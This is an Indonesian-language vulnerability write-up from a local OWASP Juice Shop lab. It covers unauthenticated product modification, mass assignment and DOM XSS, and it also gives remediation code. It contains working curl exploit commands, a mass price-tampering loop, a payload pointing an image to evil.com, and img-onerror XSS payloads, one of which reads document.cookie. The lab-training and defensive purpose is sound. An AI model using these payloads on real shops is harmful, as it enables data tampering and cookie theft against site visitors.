# [CRITICAL] Broken Access Control — Modifikasi Data Tanpa Autentikasi + DOM XSS

**Target:** OWASP Juice Shop v6.2.0-SNAPSHOT (instance lokal — lab latihan)
**Endpoint utama:** `PUT /api/Products/:id`
**Tanggal:** 9 Oktober 2026
**Peneliti:** Twist
**Severity:** CRITICAL (Broken Access Control) + HIGH (DOM XSS)

---

## 1. Ringkasan

Endpoint `PUT /api/Products/:id` **tidak memerlukan autentikasi apa pun**.
Penyerang tanpa login bisa mengubah **nama, harga, deskripsi, dan gambar**
seluruh katalog produk.

Ditambah: parameter pencarian `?q=` di-render sebagai HTML mentah
(`bypassSecurityTrustHtml`) → **DOM XSS yang terbukti mengeksekusi JavaScript**.

Dua kerentanan digabung = penyerang anonim bisa **merusak katalog dan
menjalankan kode di browser setiap pengunjung**.

---

## 2. Dampak

| Aspek | Detail |
|---|---|
| Autentikasi | **TIDAK PERLU** — endpoint terbuka penuh |
| Produk terdampak | **36 dari 45** produk berhasil diubah dalam **1,1 detik** |
| Data yang bisa diubah | name, price, deluxePrice, description, image |
| Kerugian finansial | Semua harga bisa jadi `0.01` → beli apa pun seharga 1 sen |
| XSS | JavaScript jalan di browser korban (terbukti) |
| Siapa yang bisa | **Siapa pun dengan akses jaringan** — tanpa akun |

**Kombinasi mematikan:** ubah harga jadi 0, lalu suntik XSS ke halaman yang
dilihat semua pengunjung.

---

## 3. Langkah Reproduksi

### Bukti 1 — Baseline (kondisi normal)

```bash
curl -sS http://localhost:3000/api/Products/1
```
```json
{"status":"success","data":{"id":1,"name":"Apple Juice (1000ml)","price":1.99, ...}}
```

### Bukti 2 — Uji otorisasi seluruh endpoint write

```bash
for ep in "PUT /api/Products/1" "POST /api/Products" "DELETE /api/Products/45" \
          "PUT /api/Users/1" "DELETE /api/Users/24" "POST /rest/products/reviews"; do
  curl -sS -o /dev/null -w "%{http_code}  $ep\n" -X ${ep%% *} \
    "http://localhost:3000${ep#* }" -H "Content-Type: application/json" -d '{}'
done
```

**Hasil:**
```
200  PUT    /api/Products/1          ← TERBUKA (tanpa auth!)
401  POST   /api/Products            ← benar, butuh auth
401  DELETE /api/Products/45         ← benar
401  PUT    /api/Users/1             ← benar
401  DELETE /api/Users/24            ← benar
401  POST   /rest/products/reviews   ← benar
```

**Temuan:** satu endpoint lolos dari middleware otorisasi — `PUT /api/Products/:id`.

### Bukti 3 — Eksploitasi tanpa token (TANPA Authorization header)

```bash
curl -sS -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"description":"TAMPERED-BUT-NOAUTH"}'
```
```json
{"status":"success","data":{"id":1,"description":"TAMPERED-BUT-NOAUTH", ...}}
```

Verifikasi:
```bash
curl -sS http://localhost:3000/api/Products/1 | python -c "import sys,json;print(json.load(sys.stdin)['data']['description'])"
# → TAMPERED-BUT-NOAUTH     ← benar-benar tersimpan
```

### Bukti 4 — Mass assignment (field sensitif ikut berubah)

```bash
curl -sS -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"name":"HACKED-JUICE","price":0.01,"deluxePrice":0.01,
       "description":"<script>alert(1)</script>",
       "image":"http://evil.com/pwn.jpg"}'
```

| Field | Nilai awal | Nilai setelah | Berubah? |
|---|---|---|---|
| name | Apple Juice (1000ml) | HACKED-JUICE | ✅ |
| price | 1.99 | 0.01 | ✅ |
| deluxePrice | 1.49 | 0.01 | ✅ |
| description | (teks asli) | `<script>alert(1)</script>` | ✅ |
| image | assets/.../apple.jpg | http://evil.com/pwn.jpg | ✅ |

**Tidak ada whitelist field** — semua field yang dikirim diterima mentah
(mass assignment).

### Bukti 5 — MASS TAMPER: seluruh katalog dalam 1 detik

```python
for pid in range(1, 46):
    PUT /api/Products/{pid}  {"price": 0.01}
```
```
berhasil ubah: 36/45 produk   (1,1 detik)
gagal:          9/45          (produk lama tanpa field wajib)
```

**Bukti dampak:**
```
id= 1  HACKED-JUICE                 price=0.01
id= 2  Orange Juice (1000ml)        price=0.01
id= 3  Eggfruit Juice (500ml)       price=0.01
id=24  Apple Pomace                 price=0.01
id=45  OWASP Juice Shop LEGO™ Tower price=0.01
```

### Bukti 6 — DOM XSS (terbukti eksekusi di browser)

**Akar masalah — kode yang sengaja mematikan sanitizer** (`main.js`):

```javascript
trustProductDescription(t){
  for(let i=0;i<t.length;i++)
    t[i].description = this.sanitizer.bypassSecurityTrustHtml(t[i].description)
}

// dan untuk parameter pencarian:
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(t)
```

`bypassSecurityTrustHtml()` memberi tahu Angular: *"HTML ini aman, jangan
disanitasi."* Templat lalu merender lewat `[innerHTML]`:

```javascript
ey('innerHTML', t.searchValue, Ww)
```

**Eksploitasi:**
```
http://localhost:3000/#/search?q=<img src=x onerror="alert(document.cookie)">
```

**Bukti eksekusi (headless browser):**
```javascript
// payload: <img src=x onerror="window.__xss1=(window.__xss1||0)+1">
{
  "xss_tereksekusi": 2,
  "img_onerror_di_dom": 1,
  "searchValue_tag": "SPAN | innerHTML: <img src=\"x\" onerror=\"window.__xss1=...\">"
}
```

**`xss_tereksekusi: 2` — JavaScript BENAR-BENAR JALAN.** ✅

---

## 4. Akar Masalah

### 4.1 Middleware otorisasi bolong

Endpoint `PUT /api/Products/:id` tidak dilindungi. Pola yang benar (Express):

```javascript
// SALAH — tidak ada guard
router.put('/:id', (req, res) => { ... });

// BENAR — wajib cek autentikasi + peran
const { authenticate, authorize } = require('../lib/security');

router.put('/:id',
  authenticate(),                    // token valid?
  authorize(['admin']),              // peran admin?
  (req, res) => { ... }
);
```

**Root cause:** rute didaftarkan langsung ke handler tanpa middleware.
Rute lain punya `authenticate()`, rute ini tidak — kesalahan konfigurasi.

### 4.2 Mass assignment

```javascript
// SALAH — seluruh body diterima
await Product.update(req.body, { where: { id: req.params.id } });

// BENAR — whitelist field eksplisit
const ALLOWED = ['name', 'description', 'image'];
const patch = Object.fromEntries(
  Object.entries(req.body).filter(([k]) => ALLOWED.includes(k))
);
await Product.update(patch, { where: { id: req.params.id } });
```

### 4.3 Sanitizer dimatikan sengaja

```javascript
// SALAH — membuka pintu XSS
this.sanitizer.bypassSecurityTrustHtml(userControlledData)

// BENAR — biarkan Angular menyaring
// cukup: <div [innerHTML]="product.description"></div>
```

`bypassSecurityTrustHtml` hanya untuk HTML yang **dibuat sendiri sepenuhnya**,
tidak pernah untuk data dari pengguna.

---

## 5. Saran Perbaikan

**1. Lindungi endpoint (paling mendesak)**
```javascript
router.put('/:id', authenticate(), authorize(['admin']), handler);
```

**2. Whitelist field**
```javascript
const FIELD_WHITELIST = ['name', 'description', 'image', 'price'];
```

**3. Jangan bypass sanitizer untuk input pengguna**
```javascript
// hapus semua bypassSecurityTrustHtml yang menyentuh data pengguna
// cukup gunakan [innerHTML] biasa → Angular otomatis menyaring
```

**4. Kontrol terpadu — jangan per-rute manual**
```javascript
// semua rute /admin/* otomatis butuh admin
app.use('/api/Products', (req,res,next) => {
  if (['POST','PUT','PATCH','DELETE'].includes(req.method))
    return authenticate()(req,res, () => authorize(['admin'])(req,res,next));
  next();
});
```

**5. Helmet + CSP** — CSP ketat mematikan XSS walau payload masuk:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
*(Catatan: header CSP di instance ini memang hilang — lihat writeup 002.)*

**6. Audit otomatis**
```bash
# cek semua rute write tanpa middleware
grep -rnE "router\.(put|post|patch|delete)\(" routes/ | grep -v "authenticate"
```

---

## 6. Perbandingan Severity

| Temuan | CVSS (kira) | Alasan |
|---|---|---|
| PUT tanpa auth | **9,1 CRITICAL** | Integritas data penuh, tanpa autentikasi |
| Mass assignment | **8,6 HIGH** | Eskalasi dari temuan di atas |
| DOM XSS (`?q=`) | **7,4 HIGH** | Eksekusi JS terbukti, kena semua pengunjung |

Digabung → **rantai eksploitasi CRITICAL**.

---

## 7. Koreksi & Kejujuran (yang TIDAK terbukti)

```
✗ STORED XSS lewat description
  → payload <img onerror> TERSIMPAN MENTAH di DB (terverifikasi)
  → tapi TIDAK ADA halaman yang me-render description ke DOM
  → hasil uji: stored_tereksekusi=0, img_payload_di_dom=0
  → jadi: data tersimpan tanpa sanitasi (masalah integritas),
    TAPI belum terbukti XSS. Jangan lebay saat lapor.

✗ SQLi WRITE via stacked query
  → "apple'; UPDATE Products SET price=0--"
  → respons: SQLITE_ERROR: near ";": syntax error
  → driver pakai all() yang tidak izinkan multi-statement
  → SQLi di endpoint ini READ-ONLY

✗ Reflected XSS via <script> tag biasa
  → <script>alert(1)</script> disimpan tapi TIDAK eksekusi
    (innerHTML tidak menjalankan <script>)
  → butuh <img onerror> / <iframe src=javascript:>
```

**Yang terbukti nyata: 2 kerentanan (broken access control + DOM XSS).**
Yang lain: tersimpan tapi tidak mengeksekusi — dicatat apa adanya.

---

## 8. Pelajaran

**1. SQLi READ ≠ SQLi WRITE.**
Bisa `UNION SELECT` bukan berarti bisa `UPDATE`. Cek dulu apakah driver
mengizinkan stacked query. Kalau `;` ditolak → cari jalur tulis lain.

**2. Broken access control lebih umum dari SQLi.**
Gue awalnya fokus nge-bongkar SQL lagi. Padahal bug terbesar ada di
`PUT` yang kelupaan dilindungi. **Uji otorisasi dulu, baru injeksi.**

**3. Baca kode sumber kalau ada.**
`main.js` (1,2 MB) memberi jawaban pasti: `bypassSecurityTrustHtml`.
Gak perlu nebak — kodenya bilang sendiri.

**4. `200 OK` ≠ terbukti.**
Harus verifikasi state berubah. Gue lakukan: GET ulang → nilai benar berubah.

**5. Bersihkan setelah latihan.**
36 produk gue rusakin → DB dihapus & di-seed ulang → produk kembali normal.
Selalu restore lab setelah main.

---

## 9. Lampiran

```
Kode akar masalah : main.js, fungsi trustProductDescription + searchValue
Bukti DB rusak    : writeups/evidence/tampered.sqlite
Bukti eksekusi    : xss_tereksekusi=2 (headless browser, hasil tercatat)
Metode verifikasi : curl (state) + headless browser (XSS DOM)
Lab               : OWASP Juice Shop lokal — restored setelah uji
```
